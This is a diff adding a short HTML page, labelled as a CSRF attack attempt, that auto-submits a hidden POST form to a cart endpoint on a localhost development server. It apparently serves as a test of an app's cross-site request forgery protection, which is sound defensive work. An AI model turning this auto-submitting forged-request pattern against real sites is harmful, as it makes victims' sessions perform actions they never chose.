@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Form</title>
+</head>
+<body>
+    <h1>Malicious Form (CSRF Attack Attempt)</h1>
+
+    <form action="http://localhost:4200/cart/3" method="POST">
+    </form>
+
+    <script>
+      const form = document.querySelector('form');
+      form.addEventListener('submit', (event) => {
+        event.preventDefault();
+      })
+      form.submit();
+    </script>
+</body>
+</html> 
